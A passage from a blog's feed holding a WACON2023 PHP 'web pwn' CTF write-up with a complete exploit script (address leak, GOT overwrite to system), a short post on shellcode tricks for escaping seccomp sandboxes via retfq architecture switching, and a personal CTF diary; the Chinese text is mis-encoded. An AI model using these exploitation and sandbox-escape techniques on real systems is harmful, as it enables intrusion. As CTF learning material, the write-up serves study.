</span><span class="language-bash">run</span></span><br></pre></td></tr></table></figure><p>You can also write them in a gdb script.</p><h2 id="Address-Leak"><a href="#Address-Leak" class="headerlink" title="Address Leak"></a>Address Leak</h2><p>Through overwrite the content pointer of any notes, we may get content of arbitrary address through <code>zif_view_note</code>.</p><p>First step, we can leak an fd pointer (by <code>zif_view_note</code> or <code>zif_list_note</code> ). Our heap memory was allocated by mmap anonymously, it doesn&#96;t have a constant offset with libc.so or heaphp.so.</p><p><img src="/../img/php-pwn.assets/image-20230915150945514.png" alt="image-20230915150945514"></p><p>However, we may find a pointer related to libc.so or heaphp.so on the heap. It could be extremely hard to find one through analyzing the source code. But I found a useful tool in pwndbg.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usage: leakfind [-h] [-p [PAGE_NAME]] [-o [MAX_OFFSET]] [-d [MAX_DEPTH]] [-s [STEP]] [--negative_offset [NEGATIVE_OFFSET]] address</span><br></pre></td></tr></table></figure><p><code>leakfind</code> is a powerful tool to leak address given a starting address, then we can find some libc pointers on the heap.</p><p><img src="/../img/php-pwn.assets/image-20230915151632552.png" alt="image-20230915151632552"></p><p>On obtaining the libc address, we get heaphp.so address since they have constant offset, then we can overwrite the <code>_efree@got.plt</code> on the heaphp.so with the actual address of <code>system</code>  on libc.so.</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>It`s not the final edition because functions like <code>chr()</code> are banned in the docker, and getting shell is usually not allowed in PHP pwn. I preserved them to make it more readable.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// function mychr($index)&#123;</span></span><br><span class="line"><span class="comment">// return [&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;, &#x27;\x7f&#x27;, &#x27;\x80&#x27;, &#x27;\x81&#x27;, &#x27;\x82&#x27;, &#x27;\x83&#x27;, &#x27;\x84&#x27;, &#x27;\x85&#x27;, &#x27;\x86&#x27;, &#x27;\x87&#x27;, &#x27;\x88&#x27;, &#x27;\x89&#x27;, &#x27;\x8a&#x27;, &#x27;\x8b&#x27;, &#x27;\x8c&#x27;, &#x27;\x8d&#x27;, &#x27;\x8e&#x27;, &#x27;\x8f&#x27;, &#x27;\x90&#x27;, &#x27;\x91&#x27;, &#x27;\x92&#x27;, &#x27;\x93&#x27;, &#x27;\x94&#x27;, &#x27;\x95&#x27;, &#x27;\x96&#x27;, &#x27;\x97&#x27;, &#x27;\x98&#x27;, &#x27;\x99&#x27;, &#x27;\x9a&#x27;, &#x27;\x9b&#x27;, &#x27;\x9c&#x27;, &#x27;\x9d&#x27;, &#x27;\x9e&#x27;, &#x27;\x9f&#x27;, &#x27;\xa0&#x27;, &#x27;¬°&#x27;, &#x27;¬¢&#x27;, &#x27;¬£&#x27;, &#x27;¬§&#x27;, &#x27;¬•&#x27;, &#x27;¬¶&#x27;, &#x27;¬ß&#x27;, &#x27;¬®&#x27;, &#x27;¬©&#x27;, &#x27;¬™&#x27;, &#x27;¬´&#x27;, &#x27;¬¨&#x27;, &#x27;\xad&#x27;, &#x27;¬Æ&#x27;, &#x27;¬Ø&#x27;, &#x27;¬∞&#x27;, &#x27;¬±&#x27;, &#x27;¬≤&#x27;, &#x27;¬≥&#x27;, &#x27;¬¥&#x27;, &#x27;¬µ&#x27;, &#x27;¬∂&#x27;, &#x27;¬∑&#x27;, &#x27;¬∏&#x27;, &#x27;¬π&#x27;, &#x27;¬∫&#x27;, &#x27;¬ª&#x27;, &#x27;¬º&#x27;, &#x27;¬Ω&#x27;, &#x27;¬æ&#x27;, &#x27;¬ø&#x27;, &#x27;√Ä&#x27;, &#x27;√Å&#x27;, &#x27;√Ç&#x27;, &#x27;√É&#x27;, &#x27;√Ñ&#x27;, &#x27;√Ö&#x27;, &#x27;√Ü&#x27;, &#x27;√á&#x27;, &#x27;√à&#x27;, &#x27;√â&#x27;, &#x27;√ä&#x27;, &#x27;√ã&#x27;, &#x27;√å&#x27;, &#x27;√ç&#x27;, &#x27;√é&#x27;, &#x27;√è&#x27;, &#x27;√ê&#x27;, &#x27;√ë&#x27;, &#x27;√í&#x27;, &#x27;√ì&#x27;, &#x27;√î&#x27;, &#x27;√ï&#x27;, &#x27;√ñ&#x27;, &#x27;√ó&#x27;, &#x27;√ò&#x27;, &#x27;√ô&#x27;, &#x27;√ö&#x27;, &#x27;√õ&#x27;, &#x27;√ú&#x27;, &#x27;√ù&#x27;, &#x27;√û&#x27;, &#x27;√ü&#x27;, &#x27;√†&#x27;, &#x27;√°&#x27;, &#x27;√¢&#x27;, &#x27;√£&#x27;, &#x27;√§&#x27;, &#x27;√•&#x27;, &#x27;√¶&#x27;, &#x27;√ß&#x27;, &#x27;√®&#x27;, &#x27;√©&#x27;, &#x27;√™&#x27;, &#x27;√´&#x27;, &#x27;√¨&#x27;, &#x27;√≠&#x27;, &#x27;√Æ&#x27;, &#x27;√Ø&#x27;, &#x27;√∞&#x27;, &#x27;√±&#x27;, &#x27;√≤&#x27;, &#x27;√≥&#x27;, &#x27;√¥&#x27;, &#x27;√µ&#x27;, &#x27;√∂&#x27;, &#x27;√∑&#x27;, &#x27;√∏&#x27;, &#x27;√π&#x27;, &#x27;√∫&#x27;, &#x27;√ª&#x27;, &#x27;√º&#x27;, &#x27;√Ω&#x27;, &#x27;√æ&#x27;, &#x27;√ø&#x27;][$index];</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tobytes</span>(<span class="params"><span class="variable">$integerValue</span>, <span class="variable">$byteLength</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$byteString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$byteLength</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$byteString</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$integerValue</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="variable">$integerValue</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$byteString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number1&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00/bin/shacaaadaaaeaaafaaagaaahaaaiaaajaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fd</span>=<span class="title function_ invoke__">list_note</span>();</span><br><span class="line"><span class="variable">$fd</span> = <span class="variable">$fd</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$decimalValue</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">6</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$fd</span>[-<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$decimalValue</span> = (<span class="variable">$decimalValue</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$heap_base</span> = <span class="variable">$decimalValue</span> - <span class="number">0x1480</span>;</span><br><span class="line"><span class="variable">$target_libc</span> = <span class="variable">$heap_base</span> + <span class="number">0x82000</span>; </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$target_libc</span>,<span class="number">8</span>));</span><br><span class="line"><span class="variable">$libc_off</span> = <span class="title function_ invoke__">view_note</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$libc</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">5</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$libc_off</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$libc</span> = (<span class="variable">$libc</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$libc</span> -= <span class="number">0x219aa0</span>;</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;%x&quot;</span>,<span class="variable">$libc</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$heaphp_base</span> = <span class="variable">$libc</span> + <span class="number">0x7af000</span>;</span><br><span class="line"><span class="variable">$sys_addr</span> = <span class="variable">$libc</span> + <span class="number">0x50d60</span>;</span><br><span class="line"><span class="variable">$efree_got_addr</span> = <span class="variable">$heaphp_base</span> + <span class="number">0x4058</span>;</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$efree_got_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;./readflag&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">edit_note</span>(<span class="number">1</span>,<span class="title function_ invoke__">tobytes</span>(<span class="variable">$sys_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;It&amp;#96;s my first time encountering this fancy pwn item, known as Web Pwn, on WACON2023. I have few experience on php coding, so it spent</summary>
      
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
    <category term="wp" scheme="http://deepunk.icu/tags/wp/"/>
    
    <category term="PHP" scheme="http://deepunk.icu/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Tricks of Shellcode</title>
    <link href="http://deepunk.icu/Tricks-of-Shellcode/"/>
    <id>http://deepunk.icu/Tricks-of-Shellcode/</id>
    <published>2023-08-29T13:56:08.000Z</published>
    <updated>2023-12-09T07:11:23.568Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ÊúÄËøëÊâì‰∫ÜÊå∫Â§öÊØîËµõÔºåÁ¢∞Âà∞‰∏Ä‰∫õÊØîËæÉÊúâÊÑèÊÄùÁöÑÈ¢òÂíåÊñπÊ≥ï</p></blockquote><p>shellcodeÁöÑÈ¢òÊå∫Â§öÔºåÂæÄÂæÄÈÉΩÊòØÂä†‰∫Ü‰∏Ä‰∫õ‰π±‰∏ÉÂÖ´Á≥üÁöÑÈôêÂà∂„ÄÇ‰∏ÄËà¨Ë¶Å‰πàÈôêÂà∂Â≠óÁ¨¶ÔºåË¶Å‰πàÂºÄÊ≤ôÁÆ±„ÄÇÈôêÂà∂Â≠óÁ¨¶Âü∫Êú¨‰∏äÂ∞±ÈÄöËøáÊâãÊêì<del>Êàë‰∏ç‰ºö</del>ÊàñËÄÖalpha3‰πãÁ±ªÁöÑÂ∑•ÂÖ∑ÂÆûÁé∞ÔºåËøôÈáåËÆ≤‰∏Ä‰∫õÁªïËøáÊ≤ôÁÆ±ÁöÑÂäûÊ≥ï„ÄÇ</p><h1 id="ÂàáÊç¢Êû∂ÊûÑ"><a href="#ÂàáÊç¢Êû∂ÊûÑ" class="headerlink" title="ÂàáÊç¢Êû∂ÊûÑ"></a>ÂàáÊç¢Êû∂ÊûÑ</h1><p>È¢òÁõÆ‰∏ç‰ªÖÁ¶ÅÊ≠¢getshellÔºåÁîöËá≥ÈôêÂà∂‰∫ÜorwÔºåÂ¶ÇÊûúÊ≤ôÁÆ±Ê≤°ÊúâÂØπÁ≥ªÁªüÊû∂ÊûÑËøõË°åÊ£ÄÊü•ÔºåÂ∞±ÂèØ‰ª•‰ΩøÁî®ÂàáÊç¢Êû∂ÊûÑÁöÑÊñπÂºè„ÄÇ</p><p>ÂéüÁêÜÊòØÊ≤ôÁÆ±ÈÄöËøáÊ£ÄÊµãÁ≥ªÁªüË∞ÉÁî®Âè∑Âà§Êñ≠ÊòØÂê¶ÊîæË°åÔºåËÄå64‰ΩçÂíå32‰ΩçÊû∂ÊûÑ‰∏ãÁöÑÁ≥ªÁªüË∞ÉÁî®Âè∑Âèà‰∏çÁõ∏ÂêåÔºåÂàáÊç¢Âà∞Âè¶‰∏ÄÁßçÊû∂ÊûÑÔºåÂ∞±ËÉΩÂÆûÁé∞ÁªïËøáÈªëÂêçÂçïÊ£ÄÊü•</p><p>ËøôÁßçÊâãÊ≥ïÂê¨Ëµ∑Êù•ÂæàÁÇ´ÈÖ∑ÔºåÊìç‰ΩúÂç¥Áõ∏ÂΩìÁÆÄÂçï</p><p>Á®ãÂ∫èËøêË°åÊó∂ÁöÑÊû∂ÊûÑÔºåÊòØÁî±<code>cs</code>ÂØÑÂ≠òÂô®ÊéßÂà∂ÁöÑ„ÄÇ<code>cs=0x23</code>‰∏∫32‰ΩçÊ®°ÂºèÔºå<code>cs=0x33</code>‰∏∫64‰ΩçÊ®°Âºè„ÄÇËÄå<code>retfq</code>Êåá‰ª§Â∞±ËÉΩÂÆûÁé∞ÂØπ<code>cs</code>ÁöÑËµãÂÄº</p><p><code>retfq</code>ÂåÖÂê´<code>ret</code>Âíå<code>pop cs</code>‰∏§Ê≠•Ôºå‰πüÂ∞±ÊòØÂÖàÂêépop <code>rip</code>Âíå<code>cs</code>ÔºåÊâÄ‰ª•‰∏ÄËà¨ÂèØ‰ª•ÂÉèËøôÊ†∑ÂÜôÔºö</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, 0x40404040 #arbitrary stack</span><br><span class="line">push 0x23 #or 0x33</span><br><span class="line">push 0x401145 #next shellcode</span><br><span class="line">retfq</span><br></pre></td></tr></table></figure><p>Ê≥®ÊÑèËøôÈáåÈúÄË¶ÅËÆæÁΩÆ<code>rsp</code>ÔºåËøôÊòØÂõ†‰∏∫ÂàáÊç¢Âà∞32‰ΩçÊó∂ÔºåÂØÑÂ≠òÂô®‰πü‰ºöË¢´ÂàáÊàê32‰ΩçÔºåÊâÄ‰ª•ÈúÄË¶ÅÈ¢ÑÂÖàË∞ÉÊï¥Ê†àÈ°∂ÁöÑÊåáÈíà</p><p>Âè¶Â§ñÊàëÂú®Êìç‰ΩúÊó∂ÂèëÁé∞<code>ret</code>ÂêéÁöÑÂú∞ÂùÄ‰ºº‰πéÊúâ‰∏ÄÂÆöË¶ÅÊ±Ç„ÄÇËµ∑ÂàùÊàëÁõ¥Êé•Ë∑≥Âà∞‰∏ã‰∏ÄÊù°shellcode‰∏äÔºå‰ΩÜ‰ºöÂú®retfqÊó∂Â¥©Ê∫ÉÔºåÂêéÊù•Êàë<code>ret</code>Âà∞‰ª£Á†ÅÊÆµÈáåË∞ÉÁî®shellcodeÁöÑÂú∞ÂùÄÔºåÂÜçÊèêÂâçËÆæÁΩÆÂ•ΩÂØÑÂ≠òÂô®ÔºåÈ°∫Âà©Ëß£ÂÜ≥‰∫ÜËøô‰∏™ÈóÆÈ¢ò</p><h1 id="ËÄÖË°åÂ≠ô"><a href="#ËÄÖË°åÂ≠ô" class="headerlink" title="ËÄÖË°åÂ≠ô"></a>ËÄÖË°åÂ≠ô</h1><p><del>‰Ω†Â∞±ËØ¥ÊòØ‰∏çÊòØ‰∏Ä‰∏™‰∏úË•øÂêß</del></p><p>Ê≤°ÊúâopenÁöÑÂèØ‰ª•Áî®openat‰ª£Êõø</p><p>Ê≤°ÊúâreadÁöÑÂèØ‰ª•Áî®pread64&#x2F;writev‰ª£Êõø</p><p><a href="https://evian-zhang.github.io/introduction-to-linux-x86_64-syscall/src/filesystem/read-pread64-readv-preadv-preadv2.html">read, pread64, readv, preadv, preadv2Á≥ªÁªüË∞ÉÁî®</a></p><p>Ëøô‰πàÁé©Â∞±Ê≤°ÊÑèÊÄù‰∫Ü</p><h1 id="‰ΩøÁî®socket"><a href="#‰ΩøÁî®socket" class="headerlink" title="‰ΩøÁî®socket"></a>‰ΩøÁî®socket</h1><p>ÊúâÁ©∫ÁúãÁúã</p><p><a href="http://blog.eonew.cn/2019-06-03.%E5%8F%8D%E5%90%91shellcode.html">EXÂ§ß‰Ω¨ÁöÑÂçöÂÆ¢</a></p><h1 id="Áõ≤Ê≥®"><a href="#Áõ≤Ê≥®" class="headerlink" title="Áõ≤Ê≥®"></a>Áõ≤Ê≥®</h1><p>Êå∫ÊúâË∂£ÁöÑÂÅöÊ≥ïÔºåÊâæÊó∂Èó¥ÂÜçËØ¶ÁªÜÁ†îÁ©∂‰∏ã</p><p><a href="https://m1ku.in/archives/737">m1kuÂ§ß‰Ω¨ÁöÑÂçöÂÆ¢</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ÊúÄËøëÊâì‰∫ÜÊå∫Â§öÊØîËµõÔºåÁ¢∞Âà∞‰∏Ä‰∫õÊØîËæÉÊúâÊÑèÊÄùÁöÑÈ¢òÂíåÊñπÊ≥ï&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;shellcodeÁöÑÈ¢òÊå∫Â§öÔºåÂæÄÂæÄÈÉΩÊòØÂä†‰∫Ü‰∏Ä‰∫õ‰π±‰∏ÉÂÖ´Á≥üÁöÑÈôêÂà∂„ÄÇ‰∏ÄËà¨Ë¶Å‰πàÈôêÂà∂Â≠óÁ¨¶ÔºåË¶Å‰πàÂºÄÊ≤ôÁÆ±„ÄÇÈôêÂà∂Â≠óÁ¨¶Âü∫Êú¨‰∏äÂ∞±ÈÄöËøáÊâãÊêì&lt;del&gt;Êàë‰∏ç‰ºö&lt;/del&gt;ÊàñËÄÖalpha3</summary>
      
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Êë∏</title>
    <link href="http://deepunk.icu/%E6%91%B8/"/>
    <id>http://deepunk.icu/%E6%91%B8/</id>
    <published>2023-08-27T08:30:57.000Z</published>
    <updated>2023-12-09T07:11:23.576Z</updated>
    
    <content type="html"><![CDATA[<p>Âú®Áîµ‰∏ìÊë∏‰∫Ü‰∏ÄÂπ¥Ôºå‰∏çÁü•‰∏çËßâÂ∑≤ÁªèÊàê‰∫ÜËÄÅÊ≤πÊù°ÁöÑÂΩ¢Áä∂</p><p>Â§ß‰∏ÄÊï¥‰ΩìÂ§Ñ‰∫é‰∏Ä‰∏™ÊØîËæÉËø∑Ëå´ÁöÑÁä∂ÊÄÅ„ÄÇÂºÄÂ≠¶Êó∂ÔºåÊú∫ÁºòÂ∑ßÂêà‰∏ãÁ¢∞ËßÅ‰∫ÜÂáùËÅöÁöÑÊãõÊñ∞ËµõÔºåÈù†ÁùÄÁÉ≠ÊÉÖÂÜ≤‰∫Ü‰∏Ä‰∏™ÊúàÔºå‰ª•pwnÊâãÁöÑË∫´‰ªΩËøõÂÖ•ÔºåÈöèÂêéÂ∞±ÂºÄÂßã<strong>ÈïøËææ‰∏Ä‰∏™ÂçäÂ≠¶Êúü</strong>ÁöÑÊë∏È±ºÊúü„ÄÇÊúüÈó¥ÊàñÊòØÂç∑ÂàÜÊï∞ÔºàÈõÜÁîµÂ≠¶Èô¢ÁöÑÈ£éÊ∞îÊáÇÁöÑÈÉΩÊáÇÔºâÔºåÊàñÊòØÊêû‰∏Ä‰∫õ‰π±‰∏ÉÂÖ´Á≥üÁöÑÊØîËµõÔºà‰πüÊ≤°Êúâ‰ªÄ‰πàÊàêÁª©ÔºâÔºåÊõ¥Â§öÁöÑÊó∂ÂÄôÔºåËÆ∞ÂøÜÁº∫Â§±ÔºåÂ§ßÊäµÊòØÂú®Êë∏È±ºÁΩ¢</p><p>ÂêéÊù•Â§ß‰∏Ä‰∏ãÔºåÂéª‰∫ÜË∂üASCÁöÑËßÇÊë©ÔºåËÆ§ËØÜ‰∫Ü‰∏Ä‰∫õÂáùËÅöÁöÑÂ≠¶ÈïøÂíåBeetovenÔºåËøòËÆ§ËØÜ‰∫ÜÂçóÊòåÂ§ßÂ≠¶ÁöÑcs‰Ω¨„ÄÇÁ™ÅÁÑ∂ËßâÂæóÔºåÊêûËøô‰∫õ‰πüÊå∫ÊúâÊÑèÊÄù„ÄÇÊ≠§ÂêéÂºÄÂßãÂèÇ‰∏éÊõ¥Â§öÂáùËÅöÁöÑÊ¥ªÂä®ÔºàÂπ∂Êç°Ëµ∑ÊâÄÂâ©‰∏çÂ§öÁöÑpwnÁü•ËØÜ</p><p>Êé•ÁùÄÂ∞±ÊòØÂõΩËµõÂàùËµõÔºå‰∫∫ÁîüÁ¨¨‰∫åÊ¨°Êù•Âà∞Â∑•‰ΩúÂÆ§ÔºåÁ§æÊÅêÂæóÂÆõÂ¶Ç‰∏Ä‰∏™Êñ∞Áîü„ÄÇÂ•ΩÂú®ÂàùËµõÊúâ‰∫õÁÆÄÂçïÈ¢òÔºåÊå∫ÈÄÇÂêàÊàëËøôÁßçÊãõÊñ∞ËµõÊ∞¥Âπ≥ÈÄâÊâãÂ∫∑Â§ç„ÄÇÊúÄÂêéËøòÊòØÈ°∫Âà©Ëøõ‰∫ÜÂ§çËµõ</p><p>Â§çËµõÁöÑÊó∂ÂÄôËøûÂ†ÜÈÉΩ‰∏ç‰ºöÔºåÁ∫ØfwÔºåÊå∫ÂèØÊÉúÔºåËøòÊòØÂíåCasio3ÁªÑÁöÑÈòü„ÄÇ‰∫ãÂêéÁóõÂÆöÊÄùÁóõÔºåÂÜ≥ÂÆö‰ª•Âêé‰∏çÊë∏‰∫Ü</p><p>Ê≠§Êó∂ÁöÑÊàëÊÄé‰πà‰πüÊÉ≥‰∏çÂà∞Ôºå‰∏Ä‰∏™Êúà‰πãÂêéÔºåÊàë‰ºöÂú®ËÆ≤Âè∞‰∏äÁªô‰∫∫ËÆ≤È´òÁâàÊú¨Â†ÜÂà©Áî®Ôºà</p><p>ÂüπËÆ≠ÂâçËøòÊúâ‰∏™Â∞èÊèíÊõ≤Ôºå<del>Âõ†‰∏∫ÂÜõËÆ≠ÁöÑÊüêÁßçÁ•ûÂøÖÂäõÈáè</del>ÔºåÈÑô‰∫∫ÂÖ®Ë∫´Ëµ∑ÁñπÂ≠êÂú®ÂåªÈô¢Ë∫∫‰∫Ü‰∏ÄÂë®</p><p>ÊöëÂÅáÊúüÈó¥Êâì‰∫Ü‰∏Ä‰∫õÊØîËµõÔºå<del>ÊÑüËßâÊàëÊÄé‰πà‰ªÄ‰πàÈÉΩ‰∏ç‰ºö</del>ÊÑüËßâÊàëÁöÑ‰∫åËøõÂà∂‰πãÊóÖÊâçÂàöÂàöÂºÄÂßã</p><hr><p>Êë∏ËøáÊù•ÁöÑËøô‰∏ÄÂπ¥ÔºåÊàêÁª©‰∏ç‰∏ä‰∏ç‰∏ãÔºåÂ•ΩÂú®Ê≤°ÊúâÊéâÂá∫‰øùÁ†îÁ∫ø„ÄÇ‰∫åËøõÂà∂‰æùÊóßÊòØ‰∏Ä‰∏™Êñ∞‰∫∫ÁöÑÊ∞¥Âπ≥ÔºåÊÉ≥Âà∞È©¨‰∏äÂèàË¶ÅËøéÊé•‰∏ã‰∏ÄÂ±äÊñ∞‰∫∫Ôºå